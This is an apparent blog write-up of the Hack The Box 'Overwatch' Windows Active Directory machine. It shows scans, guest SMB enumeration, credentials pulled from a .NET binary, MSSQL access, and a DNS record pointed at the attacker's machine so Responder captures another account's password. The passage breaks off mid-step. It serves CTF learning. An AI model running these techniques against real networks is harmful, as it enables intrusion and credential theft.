@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Overwatch | Paracausal Telemetry</title><meta name="description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), software$ smb share, Compromising sqlsvc." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Overwatch" /><meta property="og:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), software$ smb share, Compromising sqlsvc." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/og.png?v=34747f15" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Overwatch" /><meta name="twitter:description" content="Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), software$ smb share, Compromising sqlsvc." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/og.png?v=34747f15" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Overwatch","description":"Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), software$ smb share, Compromising sqlsvc.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/","datePublished":"2026-08-10","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Overwatch","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-overwatch/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Overwatch</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-08-10 · 14 min read</p><h1>Overwatch</h1><p>Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), software$ smb share, Compromising sqlsvc.</p><div class="writeup-meta"><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Overwatch" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-overwatch.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-overwatch.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Overwatch</h2><p>Overwatch is a medium-difficulty Windows machine focused on Active Directory enumeration, MSSQL abuse, and insecure .NET application development. Initial access is obtained through an anonymously accessible SMB share containing a custom .NET monitoring application, from which…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>24 Jan 2026</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.7 / 5</dd></div><div><dt>User owns</dt><dd>3,486</dd></div><div><dt>Root owns</dt><dd>3,131</dd></div><div><dt>User blood</dt><dd>gumby<small class="room-blood-time">0H 38M 59S</small></dd></div><div><dt>Root blood</dt><dd>admiin<small class="room-blood-time">0H 54M 15S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2796 votes from easiest to hardest"><rect x="0" y="59" width="20" height="5" rx="2" fill="hsl(96 70% 55%)"><title>75 votes</title></rect><rect x="26" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>44 votes</title></rect><rect x="52" y="46" width="20" height="18" rx="2" fill="hsl(80 70% 55%)"><title>293 votes</title></rect><rect x="78" y="35" width="20" height="29" rx="2" fill="hsl(70 70% 55%)"><title>478 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>1045 votes</title></rect><rect x="130" y="36" width="20" height="28" rx="2" fill="hsl(38 70% 55%)"><title>465 votes</title></rect><rect x="156" y="48" width="20" height="16" rx="2" fill="hsl(28 70% 55%)"><title>265 votes</title></rect><rect x="182" y="59" width="20" height="5" rx="2" fill="hsl(16 70% 55%)"><title>80 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>23 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>28 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.7, Real-Life 6.5, CVE 4.1, Custom Exploitation 5.9, CTF-Like 3.5"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,63.1 153.3,95.9 126.9,133.2 85.7,143.4 86.7,102.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Overwatch" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.244.81 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT s200401.overwatch.htb                 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 15:51 +0100
+Nmap scan report for s200401.overwatch.htb (10.129.244.81)
+Host is up (0.013s latency).
+rDNS record for 10.129.244.81: S200401.overwatch.htb
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+6520/tcp  open  unknown
+9389/tcp  open  adws
+49664/tcp open  unknown
+49669/tcp open  unknown
+59048/tcp open  unknown
+59049/tcp open  unknown
+59056/tcp open  unknown
+59143/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.26 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -A --min-rate=2000 -sT s200401.overwatch.htb                                                                  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 15:53 +0100
+Nmap scan report for s200401.overwatch.htb (10.129.244.81)
+Host is up (0.013s latency).
+rDNS record for 10.129.244.81: S200401.overwatch.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  tcpwrapped
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 14:53:51Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: OVERWATCH
+|   NetBIOS_Domain_Name: OVERWATCH
+|   NetBIOS_Computer_Name: S200401
+|   DNS_Domain_Name: overwatch.htb
+|   DNS_Computer_Name: S200401.overwatch.htb
+|   DNS_Tree_Name: overwatch.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-08-10T14:54:29+00:00
+| ssl-cert: Subject: commonName=S200401.overwatch.htb
+| Not valid before: 2026-05-12T14:36:16
+|_Not valid after:  2026-11-11T14:36:16
+|_ssl-date: 2026-08-10T14:55:09+00:00; -1s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+6520/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-08-10T14:47:15
+|_Not valid after:  2056-08-10T14:47:15
+| ms-sql-info: 
+|   10.129.244.81:6520: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 6520
+| ms-sql-ntlm-info: 
+|   10.129.244.81:6520: 
+|     Target_Name: OVERWATCH
+|     NetBIOS_Domain_Name: OVERWATCH
+|     NetBIOS_Computer_Name: S200401
+|     DNS_Domain_Name: overwatch.htb
+|     DNS_Computer_Name: S200401.overwatch.htb
+|     DNS_Tree_Name: overwatch.htb
+|_    Product_Version: 10.0.20348
+|_ssl-date: 2026-08-10T14:55:09+00:00; -1s from scanner time.
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth is enabled as with all domain controllers but not able to use it to access shares or list users</p><h3>Guest access</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb s200401.overwatch.htb -u &#39;Guest&#39; -p &#39;&#39;             
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\Guest:</code></pre><p>The guest account is enabled!</p><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb s200401.overwatch.htb -u &#39;Guest&#39; -p &#39;&#39; --shares
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\Guest: 
+SMB         10.129.244.81   445    S200401          [*] Enumerated shares
+SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
+SMB         10.129.244.81   445    S200401          -----           -----------     ------
+SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.244.81   445    S200401          C$                              Default share
+SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share 
+SMB         10.129.244.81   445    S200401          software$       READ            
+SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share</code></pre><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb s200401.overwatch.htb -u &#39;Guest&#39; -p &#39;&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+S200401$
+sqlsvc
+sqlmgmt
+SQL03$
+NB001$
+NB002$
+FILE01$
+S200400$
+Charlie.Moss
+Tracy.Burns
+Kathryn.Bryan
+Rachael.Thomas
+Aimee.Smith
+Duncan.Freeman
+John.Begum
+Bernard.Hilton
+Kim.Hargreaves
+Douglas.Burrows
+Carole.Murray
+Olivia.Quinn
+Trevor.Baker
+Kenneth.Dennis
+Jeremy.Marshall
+Jodie.Jones
+Thomas.Lee
+Terence.Matthews
+Colin.Roberts
+Aaron.Robinson
+Amanda.Jenkins
+Debra.Arnold
+Michelle.Willis
+Kayleigh.Jones
+Adam.Russell
+Tracey.Kelly
+Bethan.Dale
+Mandy.Wood
+Jenna.Phillips
+Carole.Yates
+Graham.Perry
+Catherine.Griffiths
+Shaun.Jackson
+Bethan.Rogers
+Ellie.Singh
+Marie.Allan
+Patrick.Holmes
+Victor.Hopkins
+Geraldine.Harper
+George.Todd
+Karl.Smith
+Jacqueline.Norton
+Frederick.Murray
+Joe.Pearce
+Paul.Collins
+Damien.Edwards
+Eileen.Phillips
+Carl.Johnson
+Kevin.Newton
+Natalie.Higgins
+Francis.Weston
+Benjamin.Davison
+Martin.Kemp
+Angela.Jones
+Gareth.Ahmed
+Deborah.Morgan
+Grace.Taylor
+Roger.Hughes
+Albert.Barrett
+Grace.Curtis
+Marilyn.Griffiths
+Tracey.Barker
+Suzanne.Hughes
+Timothy.Jackson
+Beverley.Thompson
+Clare.Bartlett
+Irene.Johnson
+Bernard.Wood
+Frank.McCarthy
+Elaine.Page
+Elaine.Walker
+Mohammad.Hill
+Glenn.Field
+Deborah.Martin
+Gail.Sullivan
+Maureen.Kirby
+Georgina.Chambers
+Philip.Harris
+Samantha.Scott
+Ann.Hill
+Chloe.Cox
+Jamie.Gough
+Frederick.Hussain
+Dean.Hobbs
+Danielle.Moore
+Timothy.Smith
+Declan.Stone
+Jacob.Wilson
+Gary.Elliott
+Peter.Slater
+Louise.Walton
+Brett.Haynes
+Elliot.Green
+Wendy.Williams
+Graham.Parker
+Abdul.Stevens
+Brett.Bailey
+Benjamin.Harrison
+Emily.Cooper
+Roger.Spencer</code></pre><p>Ive used <code>--rid-brute</code> since it also pulls out machine accounts</p><h2><code>software$</code> smb share</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //s200401.overwatch.htb/software$ -U &#39;Guest&#39;%&#39;&#39;             
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DH        0  Sat May 17 02:27:07 2025
+  ..                                DHS        0  Thu Jan  1 06:46:47 2026
+  Monitoring                         DH        0  Sat May 17 02:32:43 2025
+
+		7147007 blocks of size 4096. 1112608 blocks available
+smb: \&gt; cd Monitoring\
+smb: \Monitoring\&gt; ls
+  .                                  DH        0  Sat May 17 02:32:43 2025
+  ..                                 DH        0  Sat May 17 02:27:07 2025
+  EntityFramework.dll                AH  4991352  Thu Apr 16 21:38:42 2020
+  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 21:38:56 2020
+  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 21:38:56 2020
+  EntityFramework.xml                AH  3738289  Thu Apr 16 21:38:40 2020
+  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 15:46:10 2017
+  overwatch.exe                      AH     9728  Sat May 17 02:19:24 2025
+  overwatch.exe.config               AH     2163  Sat May 17 02:02:30 2025
+  overwatch.pdb                      AH    30208  Sat May 17 02:19:24 2025
+  System.Data.SQLite.dll             AH   450232  Sun Sep 29 21:41:18 2024
+  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 21:40:06 2024
+  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 21:40:42 2024
+  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 19:48:00 2024
+  System.Management.Automation.dll     AH   360448  Mon Jul 17 15:46:10 2017
+  System.Management.Automation.xml     AH  7145771  Mon Jul 17 15:46:10 2017
+  x64                                DH        0  Sat May 17 02:32:33 2025
+  x86                                DH        0  Sat May 17 02:32:33 2025
+
+		7147007 blocks of size 4096. 1118837 blocks available
+smb: \Monitoring\&gt;</code></pre><p>Found some dlls and exe files, ill download all of this and take a look</p><p><img src="images/overwatch/pasted-image-20260810161220.webp" alt="Screenshot" loading="lazy" /></p><p>Ive loaded the <code>overwatch.exe</code> file into ILspy and found credentials in the application</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">(&quot;Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;&quot;);</code></pre><h2>Compromising <code>sqlsvc</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb s200401.overwatch.htb -u sqlsvc -p &#39;TI0LKcfHzZw1Vv&#39; --shares
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+SMB         10.129.244.81   445    S200401          [*] Enumerated shares
+SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
+SMB         10.129.244.81   445    S200401          -----           -----------     ------
+SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.244.81   445    S200401          C$                              Default share
+SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
+SMB         10.129.244.81   445    S200401          software$       READ            
+SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share</code></pre><p>This user has more access on the shares!</p><p>This user does not have access over WINRM or RDP</p><p>No kerberoastable accounts</p><p>No password reuse</p><p>No GPP passwords</p><p>No passwords in account descriptions!</p><p>There is no lockout policy so password spraying is not an issue</p><h2>Access on mssql as <code>sqlsvc</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-mssqlclient overwatch.htb/sqlsvc:&#39;TI0LKcfHzZw1Vv&#39;@s200401 -p 6520 -windows-auth
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (OVERWATCH\sqlsvc  guest@master)&gt; </code></pre><p>I now have access to the mssql instance</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (OVERWATCH\sqlsvc  guest@master)&gt; enum_db
+name        is_trustworthy_on   
+---------   -----------------   
+master                      0   
+tempdb                      0   
+model                       0   
+msdb                        1   
+overwatch                   0   
+SQL (OVERWATCH\sqlsvc  guest@master)&gt;</code></pre><p>Non default db called <code>overwatch</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (OVERWATCH\sqlsvc  guest@master)&gt; enum_owner
+Database    Owner              
+---------   ----------------   
+master      sa                 
+tempdb      sa                 
+model       sa                 
+msdb        sa                 
+overwatch   OVERWATCH\sqlsvc   
+SQL (OVERWATCH\sqlsvc  guest@master)&gt;</code></pre><p>Looks like the current user is the owner of this db</p><p>There is nothing in any of these databases</p><h2>Compromising <code>sqlmgmt</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (OVERWATCH\sqlsvc  guest@master)&gt; enum_links
+SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
+S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
+SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
+Linked Server   Local Login   Is Self Mapping   Remote Login   
+-------------   -----------   ---------------   ------------   
+SQL (OVERWATCH\sqlsvc  guest@master)&gt;</code></pre><p>However, there is a linked server <code>SQL07</code></p><p>I cannot connect to it or execute commands on it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nslookup SQL07.overwatch.htb S200401.overwatch.htb
+Server:		S200401.overwatch.htb
+Address:	10.129.244.81#53
+
+** server can&#39;t find SQL07.overwatch.htb: NXDOMAIN</code></pre><p>As seen here, it doesnt look to hold any records, maybe i can add one with my IP address</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host s200401.overwatch.htb -d overwatch.htb -u sqlsvc -p &#39;TI0LKcfHzZw1Vv&#39; add dnsRecord SQL07 10.10.14.61
+[+] SQL07 has been successfully added</code></pre><p>So first ill add the DNS record with my IP in for the server</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>Then ill start up responder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">SQL (OVERWATCH\sqlsvc  guest@master)&gt; use_link SQL07</code></pre><p>Then ill trigger it</p><p><img src="images/overwatch/pasted-image-20260810172439.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sqlmgmt:bIhBbzMMnB82yx</code></pre><p>I now have some credentials!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb s200401.overwatch.htb -u sqlmgmt -p &#39;bIhBbzMMnB82yx&#39;                                                                                                  
